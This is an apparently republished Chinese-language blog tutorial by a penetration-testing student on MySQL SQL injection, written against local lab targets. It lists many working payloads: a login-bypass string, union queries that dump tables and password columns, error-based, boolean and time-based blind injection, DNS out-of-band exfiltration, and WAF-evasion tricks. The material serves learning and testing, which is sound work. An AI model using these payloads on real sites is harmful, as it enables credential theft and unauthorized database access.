<!doctype html><html lang=tw><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=referrer content="no-referrer"><link rel=dns-prefetch href=https://i.geekbank.cf/><title>淺談自己關於SQL注入的認識 | 极客快訊</title><meta property="og:title" content="淺談自己關於SQL注入的認識 - 极客快訊"><meta property="og:type" content="article"><meta property="og:locale" content="tw"><meta property="og:image" content><link rel=alternate hreflang=x-default href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/a1921c7.html><link rel=alternate hreflang=zh-tw href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/a1921c7.html><link rel=alternate hreflang=zh-cn href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/a1921c7.html><link rel=alternate hreflang=zh-hk href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/a1921c7.html><link rel=alternate hreflang=zh-mo href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/a1921c7.html><link rel=alternate hreflang=zh-my href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/a1921c7.html><link rel=alternate hreflang=zh-sg href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/a1921c7.html><link rel=canonical href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/a1921c7.html><meta property="article:published_time" content="2020-10-29T20:54:43+08:00"><meta property="article:modified_time" content="2020-10-29T20:54:43+08:00"><meta name=Keywords content><meta name=description content="淺談自己關於SQL注入的認識"><meta name=author content="极客快訊"><meta property="og:url" content="/tw/%E7%A7%91%E6%8A%80/a1921c7.html"><link rel=apple-touch-icon sizes=180x180 href=../../apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=../../favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=../../favicon-16x16.png><link rel=manifest href=../../site.webmanifest><link rel=mask-icon href=../../safari-pinned-tab.svg color=#5bbad5><meta name=msapplication-TileColor content="#ffc40d"><meta name=theme-color content="#ffffff"><link rel=stylesheet href=https://geekbank.cf/css/normalize.css><link rel=stylesheet href=https://geekbank.cf/css/style.css><script type=text/javascript src=https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js></script><script type=text/javascript src=https://geekbank.cf/js/jqthumb.min.js></script><script data-ad-client=ca-pub-3525055026201463 async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script></head><body><header id=header class=clearfix><div class=container><div class=col-group><div class=site-name><h1><a id=logo href>🤓 极客快訊 Geek Bank</a></h1><p class=description>為你帶來最全的科技知識 🧡</p></div><div><nav id=nav-menu class=clearfix><a class=current href>猜你喜歡</a>
<a href=../../tw/categories/%E7%A7%91%E6%8A%80.html title=科技>科技</a>
<a href=../../tw/categories/%E9%81%8A%E6%88%B2.html title=遊戲>遊戲</a>
<a href=../../tw/categories/%E7%A7%91%E5%AD%B8.html title=科學>科學</a></nav></div></div></div></header><div id=body><div class=container><div class=col-group><div class=col-8 id=main><div class=res-cons><article class=post><header><h1 class=post-title>淺談自己關於SQL注入的認識</h1></header><date class="post-meta meta-date">2020-10-29</date><div class=post-meta><span>|</span>
<span class=meta-category><a href=tw/categories/%E7%A7%91%E6%8A%80.html>科技</a></span></div><div class=post-content><p>一、簡介</p><p>本文作者是個努力進入滲透測試行業的小白，希望通過寫文章來鞏固自己所學習的知識，文章中可能有的地方會有誤差，這個充滿各種玄幻的計算機世界，有很多靈異錯誤，我暫時把自己認為對的寫出來，如果您看到這篇文章，有什麼錯誤可以直接指出，如果這篇文章可以給您帶來一點小小的啟發，那就更好了。</p><p>免責聲明：這篇文章僅供小白之間的學習交流，請勿通過學習文章之後對真實網站進行測試</p><p>二、正文：</p><p>0x01 SQL注入原理</p><p>SQL注入概念及產生原因？</p><p>當web應用向後臺數據庫傳遞SQL語句進行數據庫操作時。如果對用戶輸入的參數沒有經過嚴格的過濾處理，那麼攻擊者就可以構造特殊的SQL語句，直接輸入數據庫引擎執行，獲取或修改數據庫中的數據。</p><p>SQL注入的關鍵點？</p><p>用戶能控制輸入的內容;</p><p>web應用把用戶輸入的內容帶入到數據庫中執行;</p><p>是否回顯決定注入難度;</p><p>![在這裡插入圖片描述](https://img-blog.csdnimg.cn/20200731151329571.png)</p><p>SQL注入的危害？</p><p>猜解後臺數據庫：這是利用最多的方式，盜取網站的敏感信息。</p><p>繞過認證：例如繞過驗證登陸網站後臺。</p><p>1.後臺登錄語句：SELECT * FROM admin WHERE Username='user' and Password='pass' （萬能密碼繞過：'or '1'='1）#</p><p>注入可以藉助數據庫的存儲過程進行提權等操作</p><p>種馬（如一句話木馬）、dos</p><p>0x02 SQL注入的分類</p><p>Ø 根據請求方式分類</p><p>GET方式（常出現在搜索框或者文章的位置）</p><p>POST方式（常出現在表單的位置）</p><p>Ø 根據參數類型分類</p><p>字符型 select * from users where id=1</p><p>數字型 select * from users where id ='1'</p><p>Ø 根據注入的方法分類</p><p>聯合注入</p><p>常用: ?id=-1' union select 1,2,database() --+ (需要先判斷列數，然後通過union *列查詢)</p><p>堆疊注入 select 1,2,3;select * from test; 注意：其實就是通過分號將兩個查詢語句分開</p><p>Ø SQL盲注</p><p>基於布爾的SQL盲注 ?id=1' and 1=1 --+ (判斷值為正常頁面正常顯示，反之錯誤)</p><p>基於時間的SQL盲注 ?id=1' if(length(datbase())=8,sleep(3),1) --+(判斷數據庫長度是否為8，正確延時3秒返回，錯誤返回1，這個1就是個語法，錯誤的時候，沒有回顯位，顯示不出來1)</p><p>基於報錯的SQL盲注 ?id=1' and updatexml(1,concat('^',@@version,'^'),1) --+</p><p>Ø 根據注入的位置分類</p><p>通過用戶輸入的表單域注入</p><p>通過cookie注入</p><p>Ø 基於HTTP頭部信息的注入</p><p>Ø 根據數據庫分類</p><p>MHYSQL數據庫注入</p><p>ACCESS數據庫注入</p><p>MSSQL數據庫注入</p><p>ORACLE數據庫注入</p><p>其他數據庫的注入</p><p>文章採用的是mysql注入語句</p><p>0x03 MYSQL常用的知識瞭解</p><p>常用函數</p><p>user() //返回當前使用數據庫的用戶</p><p>version() //返回當前數據庫的版本</p><p>database() //返回當前使用的數據庫</p><p>group_concat() //多行數據拼接至一行顯示+group_by根據分組排序</p><p>concat_ws() //把不同列的數據以特定字符隔開</p><p># -- --+ //在MYSQL中的註釋符 （注意:有時候註釋符需要多試幾種，有的時候--+不行，但是#可以）</p><p>order by //排序函數、判斷列 原理：order by 後面跟哪個列名就是通過跟哪個列進行排序，如果後面跟的是數字，那麼1就代表根據第一列排序，2代表第二列，3代表第三列，那麼一直輸入數字的大小就可以判斷數據表有多少列了</p><p>count() //計數函數 報錯時候可以用到，或者布爾注入和延時注入時查詢有多少個表，多少個列的時候可以用到</p><p>rand() //產生一個隨機數返回的隨機數是大於等於 0 及小於 1 的均勻分佈隨機實數 報錯注入時候有用</p><p>UPDATEXML (XML_document, XPath_string, new_value); 第一個參數：XML_document是String格式，為XML文檔對象的名稱，文中為Doc 第二個參數：XPath_string (Xpath格式的字符串) ，如果不瞭解Xpath語法，可以在網上查找教程。 第三個參數：new_value，String格式，替換查找到的符合條件的數據 作用：改變文檔中符合條件的節點的值</p><p>extractvalue() :對XML文檔進行查詢的函數</p><p>其實就是相當於我們熟悉的HTML文件中用 &lt;div>&lt;p>&lt;a>標籤查找元素一樣</p><p>語法：extractvalue(目標xml文檔，xml路徑)</p><p>第二個參數 xml中的位置是可操作的地方，xml文檔中查找字符位置是用 /xxx/xxx/xxx/…這種格式，如果我們寫入其他格式，就會報錯，並且會返回我們寫入的非法格式內容，而這個非法的內容就是我們想要查詢的內容。</p><p>INFORMATION_SCHEMA數據庫</p><p>mysql5.0以下沒有該表</p><p>![在這裡插入圖片描述](https://img-blog.csdnimg.cn/20200731151329660.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ4NTIwNTA4,size_16,color_FFFFFF,t_70)</p><p>0x04 MYSQL數據庫聯合注入流程</p><p>聯合注入的原理：就是通過mysql的語句union 進行聯合查詢，聯合查詢的意思就是聯合前面的查詢語句一起查詢，需要注意的是 聯合查詢語句的列數需要與前面所查詢表的列數相同，不然會報錯，聯合查詢首先要判斷列</p><p>Ø 判斷是否存在注入並判斷是字符型注入還是數字型</p><p>Ø 判斷是否存在注入點</p><p>通過\ 或者 and1=1 and 1=2 and sleep(3) 查看頁面狀態之類的憑感覺是否有注入，有的話判斷閉合方式</p><p>Ø 判斷閉合方式</p><p>1. 常規閉合' ') ')) " ") "))</p><p>2. 奇葩閉合方式 一個) 和兩個 ))</p><p>通過and 1=1 和and 1=2 來判斷是否執行了我們輸入的語句</p><p>靶場經驗（我會經常通過 ' and sleep(3) --+ 延時判斷來閉合，個人習慣，然後一步一步找閉合方式，只要能閉合成功，其它都好說）</p><p>Ø 判斷查詢列數，顯示位置</p><p>order by +數字 通過頁面狀態查看有幾列然後通過union select 判斷回顯位（注意判斷回顯位的時候，前面查詢的值要為假，不然回顯位 會被前面查詢的結果所佔用，導致看不到回顯位）</p><p>靶場經驗（如果order by 被過濾了，可以通過 group by 來判斷，或者 union select 1,2,3,4,5,6, 這兩的列數查詢判斷網頁狀態）</p><p>Ø 獲取數據庫信息</p><p>利用聯合查詢，確定那一列數據顯示在界面 union select 1，2，3（如果為3列）</p><p>注意：（union 和union all 的區別 union all 顯示重複的值，而union不顯示重複的值，當union select 用不了的時候可以通過union all 來查詢）</p><p>收集數據庫相關信息 database(),user(),version()</p><p>Ø 查詢數據庫有哪些數據表</p><p>http://127.0.0.1/sqlib/Less-1/?id=-1' union select 1,2,group_concat( schema_name) from information_schema.schemata --+</p><p>Ø 查詢某個數據庫的所有表</p><p>http://127.0.0.1/sqlib/Less-1/?id=-1' union select 1,2,group_concat( table_name) from information_schema.tables where table_schema='security' --+</p><p>Ø 查找某個數據表中有哪些列</p><p>http://127.0.0.1/sqlib/Less-1/?id=-1' union select 1,2,group_concat( column_name) from information_schema.columns where table_schema='security' and table_name='users' --+</p><p>Ø 查找具體數據表中的具體數據</p><p>http://127.0.0.1/sqlib/Less-1/?id=-1' union select 1,2,group_concat(username,"__",password) from security.users --+</p><p>破解加密數據</p><p>很多時候獲取到的密碼數據都是md5加密的，可以通過md5網站或者軟件進行解密</p><p>https://www.cmd5.com/</p><p>提升權限</p><p>這個我暫時還沒學習到，以後再補</p><p>內網滲透</p><p>這個我暫時還沒學習到，以後再補</p><p>0x05 MYSQL數據庫報錯注入流程</p><p>通過 floor 報錯的方法來爆數據的本質是 group by 語句的報錯。group by 語句報錯的原因是 floor(random(0)*2)的不確定性，即可能為 0 也可能為 1group by key 執行時循環讀取數據的每一行，將結果保存於臨時表中。讀取每一行的 key 時，如果 key 存在於臨時表中，則更新臨時表中的數據（更新數據時，不再計算 rand 值）；如果該 key 不存在於臨時表中，則在臨時表中插入 key 所在行的數據。（插入數據時，會再計算rand 值）如果此時臨時表只有 key 為 1 的行不存在 key 為 0 的行，那麼數據庫要將該條記錄插入臨時表，由於是隨機數，插時又要計算一下隨機值，此時 floor(random(0)*2)結果可能為 1，就會導致插入時衝突而報錯。即檢測時和插入時兩次計算了隨機數的值實際測試中發現，出現報錯，至少要求數據記錄為 3 行，記錄數超過 3 行一定會報錯，2 行時是不報錯的。</p><p>注入流程</p><p>v id=1' union select count(*),floor(rand(0)*2) x from information_schema.schemata group by x# //判斷是否存在報錯注入</p><p></p><p>v id=1' union select count(*),concat(floor(rand(0)*2),database()) x from information_schema.schemata group by x # //爆出當前數據庫名</p><p>v id=1' union select count(*),concat(floor(rand(0)*2),0x3a,(select concat(table_name) from information_schema.tables where table_schema='dvwa' limit 0,1)) x from information_schema.schemata group by x# //爆出表</p><p></p><p>v id=1' union select count(*),concat(floor(rand(0)*2),0x3a,(select concat(column_name) from information_schema.columns where table_name='users' and table_schema='dvwa' limit 0,1)) x from information_schema.schemata group by x#④ //爆出字段名</p><p></p><p>v id=1' union select count(*),concat(floor(rand(0)*2),0x3a,(select concat(user,0x3a,password) from dvwa.users limit 0,1)) x from information_schema.schemata group by x# //爆出user和password</p><p>extractvalue（）函數原理：此函數從目標XML中返回包含所查詢值的字符串語法：extractvalue（XML_document，xpath_string）第一個參數：string格式，為XML文檔對象的名稱第二個參數：xpath_string（xpath格式的字符串）extractvalue使用時當xpath_string格式出現錯誤，mysql則會爆出xpath語法錯誤（xpath syntax）</p><p>v ?id=1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+爆表</p><p>v ?id=1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'))) --+爆字段</p><p></p><p>v ?id=1' and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users)))--+爆數據</p><p>原理：updatexml（）函數</p><p>· updatexml（）是一個使用不同的xml標記匹配和替換xml塊的函數。</p><p>· 作用：改變文檔中符合條件的節點的值</p><p>· 語法： updatexml（XML_document，XPath_string，new_value） 第一個參數：是string格式，為XML文檔對象的名稱，文中為Doc 第二個參數：代表路徑，Xpath格式的字符串例如//title【@lang】 第三個參數：string格式，替換查找到的符合條件的數據</p><p>· updatexml使用時，當xpath_string格式出現錯誤，mysql則會爆出xpath語法錯誤（xpath syntax）</p><p>· 例如： select * from test where ide = 1 and (updatexml(1,0x7e,3)); 由於0x7e是~，不屬於xpath語法格式，因此報出xpath語法錯誤。</p><p>updatexml（）函數注入流程</p><p>v ?id=1' and updatexml(1,concat(0x7e,(select database(),0x7e),1)--+暴庫名</p><p></p><p>v ?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database(),0x7e)),1) -- 爆表</p><p></p><p>v ?id=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users',0x7e)),1) --+ 爆字段</p><p></p><p>v ?id=1' and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users,0x7e)),1)--+爆數據</p><p>0x06 MYSQL基於布爾型的盲注</p><p>原理沒啥可說的，就是通過布爾語句判斷頁面的回顯狀態，在布爾型注入中，正確會回顯，錯誤沒有回顯，可以通過and 1=1 和and 1=2 來判斷回顯狀態。</p><p>v and length(database())=8 //判斷數據庫長度 然後按長度來爆破每個字母</p><p></p><p>v and substr((select database()),1,1)='s' //判斷數據庫名字,可以通過substr函數來定位字母，依次爆破</p><p></p><p>v and (select count(table_name) from information_schema.tables where table_schema=database())=2# //判斷數據庫中有多少個表,知道有多少個表之後才能對每個表進行爆破</p><p></p><p>v and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)=9# //判斷第一個表的長度,第二個表依次類推判斷第一個表的長度，意義和判斷數據庫長度一樣，然後通過limit的關鍵字來定位到每個表</p><p></p><p>v and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>97# 判斷第一個表的名字 //第二個表名依次類推判斷每個表的每個字母，通過substr 定位哪個字母，通過limit定位哪個表通過ascii轉換成ascii碼 用數字形式判斷。這裡其實用字母就行，不用轉ascii也可以</p><p></p><p>v 1' and (select count(column_name) from information_schema.columns where table_name='users')=14# //成功判斷第一個表中列數,第二個表的列依次類推爆列和爆表的意義都一樣啦</p><p></p><p>v 1' and length(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1))=1# //判斷第一個表第一個列的長度第二列依次類推</p><p></p><p>v 1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 3,1),1,1))>97# //判斷第一個表第一列的名字,第二個表的列名依次類推</p><p></p><p>v and (select length(user) from users where user_id=1)=5# //爆出需要字段的長度</p><p></p><p>v and ascii(substr((select user from users limit 0,1),1,1))=97# //爆出字段的數據的第一個字母</p><p>0x07 MYSQL基於時間的盲注</p><p>原理：其實就是看頁面狀態的回顯，最重要的一個關鍵字是sleep（）時間盲注就是在布爾的基礎上加個判斷語句if 和sleep（） 若為正確，則執行sleep 不正確，則值不存在</p><p>v and if(length(database())=8,sleep(3),1) //判斷數據庫長度 然後按長度來爆破每個字母</p><p></p><p>v and if(substr((select database()),1,1)='s',sleep(3),1) //判斷數據庫名字 可以通過substr函數來定位字母，依次爆破</p><p></p><p>v and if((select count(table_name) from information_schema.tables where table_schema=database())=2,sleep(3),1)# //判斷數據庫中有多少個表知道有多少個表之後才能對每個表進行爆破</p><p></p><p>v and if((select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)=9,sleep(3),1)# //判斷第一個表的長度,第二個表依次類推判斷第一個表的長度，意義和判斷數據庫長度一樣，然後通過limit的關鍵字來定位到每個表</p><p></p><p>v and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>97,sleep(3),1)# //判斷第一個表的名字,第二個表名依次類推判斷每個表的每個字母，通過substr 定位哪個字母，通過limit定位哪個表通過ascii轉換成ascii碼 用數字形式判斷。這裡其實用字母就行，不用轉ascii也可以</p><p></p><p>v 1' and if((select count(column_name) from information_schema.columns where table_name='users')=14,sleep(3),1)# //成功判斷第一個表中列數,第二個表的列依次類推爆列和爆表的意義都一樣啦</p><p></p><p>v 1' and if(length(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1))=1,sleep(3),1)# //判斷第一個表第一個列的長度,第二列依次類推</p><p></p><p>v 1' and if(ascii(substr((select column_name from information_schema.columns where table_name='users' limit 3,1),1,1))>97,sleep(3),1)# //判斷第一個表第一列的名字,第二個表的列名依次類推</p><p></p><p>v and if((select length(user) from users where user_id=1)=5,sleep(3),1)# //爆出需要字段的長度</p><p></p><p>v and if(ascii(substr((select user from users limit 0,1),1,1))=97,sleep(3),1)# //爆出字段的數據的第一個字母</p><p>0x08 擴展</p><p>一．寬字節注入</p><p>寬字節注入產生的原理： 寬字節注⼊源於程序員設置MySQL連接時錯誤配置為：set character_set_client=gbk，這樣配置會引發編碼轉換從⽽導致的注⼊漏洞。具體原理如下：1，正常情況下當GPC開啟或使⽤addslashes函數過濾GET或POST提交的參數時，⿊客使⽤的單引號 '就會被轉義為: '；2，但如果存在寬字節注⼊，我們輸⼊%df%27時⾸先經過上⾯提到的單引號轉義變成了%df%5c%27（%5c是反斜槓），之後在數據庫查詢前由於使⽤了GBK多字節編碼，即在漢字編碼範圍內兩個字節會被編碼為⼀個漢字。然後MySQL服務器會對查詢語句進⾏GBK編碼即%df%5c轉換成了漢字“運”，⽽單引號逃逸了出來，從⽽造成了注⼊漏洞。GBK編碼導致寬字節注⼊GBK編碼是數據庫編碼，跟前臺的編碼⽆關GBK轉UTF-8原理其實跟前⾯⾥原理⾥說的第2條是⼀樣的，我們輸⼊%df%27時⾸先經過上⾯提到的單引號轉義變成了%df%5c%27（%5c是反斜槓），然後%df%5c正好屬於gbk的漢字編碼範圍，經過iconv轉換到utf-8編碼轉換後變成了漢字“運”，從⽽吞掉了反斜槓使得單引號逃脫出來。UTF-8轉GBK這⾥我們思考下“錦”這個字，它的utf-8編碼是e98ca6，它的gbk編碼是%e5%5c，⽽上⾯提到過反斜槓\正好為%5c。所以如果我們將title設置為：錦’，⾸先經過addlashes函數或GPC對單引號轉義變為：錦’，然後會經過icnov函數會對”錦”轉化為gbk編碼，最後就是：％e5％5c％5c％27。反斜槓被轉義了（％5c％5c），從⽽單引號逃逸出來就會引發注⼊漏洞。</p><p>二．二次注入</p><p>二次注入可以理解為，攻擊者構造的惡意數據存儲在數據庫後，惡意數據被讀取並進入到SQL查詢語句所導致的注入。防禦者可能在用戶輸入惡意數據時對其中的特殊字符進行了轉義處理，但在惡意數據插入到數據庫時被處理的數據又被還原並存儲在數據庫中，當Web程序調用存儲在數據庫中的惡意數據並執行SQL查詢時，就發生了SQL二次注入。二次注入，可以概括為以下兩步:</p><p>第一步：插入惡意數據進行數據庫插入數據時，對其中的特殊字符進行了轉義處理，在寫入數據庫的時候又保留了原來的數據。</p><p>第二步：引用惡意數據開發者默認存入數據庫的數據都是安全的，在進行查詢時，直接從數據庫中取出惡意數據，沒有進行進一步的檢驗的處理。</p><p>![在這裡插入圖片描述](https://img-blog.csdnimg.cn/20200731151329659.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ4NTIwNTA4,size_16,color_FFFFFF,t_70)</p><p></p><p>三．DNSlog注入</p><p>原理：就是通過固定的命令和參數對注入點進行查詢，查詢成功後，通過concat語句將查詢成功的結果和第二個參數進行拼接，拼接後成為一個UNC路徑，並向DNS服務器發起域名解析，解析之後，我們通過查詢解析結果就可以更快的獲取數據啦。</p><p>![在這裡插入圖片描述](https://img-blog.csdnimg.cn/20200731151329671.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ4NTIwNTA4,size_16,color_FFFFFF,t_70)</p><p></p><p>作為攻擊者，提交注入語句，讓數據庫把需要查詢的值和域名拼接起來，然後發生DNS查詢，我們只要能獲得DNS的日誌，就得到了想要的值。所以我們需要有一個自己的域名，然後在域名商處配置一條NS記錄，然後我們在NS服務器上面獲取DNS日誌即可。</p><p>dnslog注入也可以稱之為dns帶外查詢，是一種注入姿勢，可以通過查詢相應的dns解析記錄，來獲取我們想要的數據</p><p>為什麼要進行dnslog注入？一般情況下，在我們無法通過聯合查詢直接獲取數據的情況下，我們只能通過盲注，來一步步的獲取數據，但是，使用盲注，手工測試是需要花費大量的時間的，可能會想到使用sqlmap直接去跑出數據，但在實際測試中，使用sqlmap跑盲注，有很大的機率，網站把ip給封掉，這就影響了我們的測試進度，也許你也可以使用代理池。</p><p>DNSlog需要理解的參數</p><p>secure_file_priv特性</p><p>secure_file_priv特性，有三種狀態</p><p>secure_file_priv為null 表示不允許導入導出</p><p>secure_file_priv指定文件夾時，表示mysql的導入導出只能發生在指定的文件夾</p><p>secure_file_priv沒有設置時，則表示沒有任何限制</p><p>LOAD_FILE()函數</p><p>LOAD_FILE()函數讀取一個文件並將其內容作為字符串返回</p><p>語法為：load_file(file_name)，其中file_name是文件的完整路徑</p><p>函數使用需要滿足的條件</p><p>文件必須位於服務器主機上</p><p>你必須具有該FILE權限才能讀取該文件。擁有該FILE權限的用戶可以讀取服務器主機上的任何文件，該文件是world-readable的或MySQL服務器可讀的，此屬性與secure_file_priv狀態相關 文件必須是所有人都可讀的，並且它的大小小於max_allowed_packet字節</p><p>UNC路徑</p><p>UNC路徑就是類似\\softer這樣的形式的網絡路徑。它符合 \\servername\sharename 格式，其中 servername 是服務器名，sharename 是共享資源的名稱。</p><p>DNSLOG平臺</p><p>http://www.dnslog.cn</p><p>http://admin.dnslog.link</p><p>http://ceye.io</p><p>四．POST注入</p><p>這個就不寫了，和正常注入的區別就是通過抓包然後在包裡改http頭信息或者參數，cookie等信息的注入，判斷閉合和注入語句都和正常注入沒區別</p><p>五．SQL注入之繞過</p><p>WAF產生的背景：</p><p>傳統防火牆 （ firewall ） 阻斷數據包àà工作網絡層Web服務器功能豐富成為攻擊目標 （應用層）waf由此而生WAF（web application rewall）稱為web應用防火牆，他是通過執行一系列針對HTTP，HTTPS的安全策略，來專門對web應用提供保護的一款產品。WAF是基於規則的防護，可以提供各種web應用的安全規則，waf生產商去維護這個規則庫，並實時為其更新，用戶按照這些規則，可以對應用進行全方面的保護</p><p>1. 架構層繞過waf</p><p>1) 用戶本身是進入waf後訪問web頁面的，只要我們找到web的真實IP，繞過waf就不在話下了在同網段內，頁面與頁面之間，服務器與服務器之間，通過waf的保護，然後展示給我們，只要我們在內部服務之間進行訪問，即可繞過waf邊界漏洞，同樣類似於同網段數據，我們可以利用已知服務器存在的ssrf漏洞，將數據直接發送給同網段的web2進行SQL注入</p><p>2. 資源限制角度繞waf</p><p>1) 由於數據太大，會導致waf無法將所有的數據都檢測完，這個時候會忽略掉我們代入的sql注入語句，從而繞過waf，即：使用POST請求，對服務器請求很大資源數據,逃逸sql注入語句。</p><p>3. 協議層面繞過</p><p>1) 基於協議層，有的waf只過濾GET請求，而對POST請求沒做別的限制，因此，可以將GET型換為POST型文件格式，頁面僅對Content-Type為application/x-www-form-urlencoded數據格式進行過濾，因此我們只要將Content-Type格式修改為multipart/form-data，即可繞過waf參數汙染：有的waf僅對部分內容進行過濾，例如：index。php？id=1&id=2&id=3這樣的參數id=1，waf也僅對前部分的id=1進行檢測，而後面的參數並不做處理。這樣我們就可以在id=2的後面寫入sql注入語句進行sql注入</p><p>4. 規則層面繞waf</p><p>A. 等價函數 :</p><p>1. hex()、bin() ==> ascii()</p><p>2. sleep() >benchmark()</p><p>3. concat_ws()>group_concat()</p><p>4. mid()、substr() ==> substring()</p><p>5. @@version ==> version()</p><p>B. 等價符號 :</p><p>1. and和or不能使用可以嘗試下&&和||，還有=不能使用的情況可以考慮嘗試&lt;、>因為如果不小於又不大於那便是等於。邏輯異或xor,like(可以)特殊符號:使用反引號`，例如select `version()`，可以用來過空格和正則，特殊情況下還可以將其做註釋符用, group by 9(可以)</p><p>C. 緩衝區溢出：</p><p>1. and(select 1)=(Select 0xA*1000) uNiOn SeLeCt 1,2,version()　--+</p><p>寬字節繞過 : yuns’</p><p>asp允許每個字符前面添加一個%號SELECT FIELD FROM TABLE ààà %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</p><p>二次注入 : admin ‘#</p><p>1. 二次注入是一種應對轉義的手段，其能成功的核心點是隻被轉義一次的情況下“/”不會被存入數據庫，所以取出來的數據沒有轉義符號</p><p>編碼繞過(utf,base64,url,unicode)</p><p>1. ("1' AND SLEEP(5)#")à 'MScgQU5EIFNMRUVQKDUpIw=='</p><p>2. SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))</p><p>大小寫繞過 : selectààSelEcT</p><p>雙寫繞過 : selselectect ààselect</p><p>內聯註釋 : /*!xxx*/ ，/*!44232*/ /**/ /*!xxx*/</p><p>替代空格 : %a0 , %0d , c , d ,%20 ,%09 ,%0b, +，/**/ , /*!xxxxxxxxxx*/</p><p>注 釋 ：%23%0a</p><p>總結：</p><p>還有挺多知識需要補充，大家可以多多交流，一起學習，一起加油，保護網絡安全，甚至在國家安全受到攻擊的時候，可以保護國家安全，想想如果可以保護國家安全就很興奮，但實力確實需要很長時間的積累才可以達到一定程度，不要放棄，努力學習，會有屬於你自己的一片天地。</p><p></p><p>注：本篇文章已獲得作者同意發表（本文由東塔安全學院某學員編輯整理而來）</p></div><div class="post-meta meta-tags"><ul class=clearfix><li><a>淺談</a></li><li><a>關於</a></li><li><a>SQL</a></li></ul></div></article></div></div><div id=secondary><section class=widget><form id=search action=//www.google.com/search method=get accept-charset=utf-8 target=_blank _lpchecked=1><input type=text name=q maxlength=20 placeholder=搜索>
<input type=hidden name=sitesearch value=geekbank.cf>
<button type=submit>🔍</button></form></section><section class=widget><h3 class=widget-title>最新文章 ⚡</h3><ul class=widget-list><li><a href=../../tw/%E7%A7%91%E6%8A%80/8c705a95.html alt=淺談無人機傾斜攝影測量技術標準 class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p3.pstatp.com/large/433b0001f1761786a418 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/8c705a95.html title=淺談無人機傾斜攝影測量技術標準>淺談無人機傾斜攝影測量技術標準</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/32b07cdf.html alt=淺談虛擬現實技術在實際中的應用是什麼？你的看法是？ class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p1.pstatp.com/large/320e000488d3da066723 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/32b07cdf.html title=淺談虛擬現實技術在實際中的應用是什麼？你的看法是？>淺談虛擬現實技術在實際中的應用是什麼？你的看法是？</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/125dee29.html alt="SQL Server中的事務與鎖" class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p3.pstatp.com/large/pgc-image/1533794121802a9afbb22f9 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/125dee29.html title="SQL Server中的事務與鎖">SQL Server中的事務與鎖</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/e9d6f488.html alt="SQL Server中的事務（附有實例）" class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p3.pstatp.com/large/pgc-image/21e047bd6e3c41fba0beac7ef3f1ce4e style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/e9d6f488.html title="SQL Server中的事務（附有實例）">SQL Server中的事務（附有實例）</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/bb071e7e.html alt="SQL 事務機制-transaction" class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p3.pstatp.com/large/pgc-image/3231427d97bf4a04b148360fea032241 style=border-radius:25px></a>
<a href=../../tw/%E7%A7%91%E6%8A%80/bb071e7e.html title="SQL 事務機制-transaction">SQL 事務機制-transaction</a></li><hr><li><a href=../../tw/%E7%A7%91%E6%8A%80/c6e14bc6.html alt=SQL基礎知識——事務 class="image featured" style=display:block;margin-left:auto;margin-right:auto;width:100%><img src=https://p3.pstatp.com/large/pgc-image/773e21df09dc4e3e8403a0a62994039d style=border-radius:25px></a>
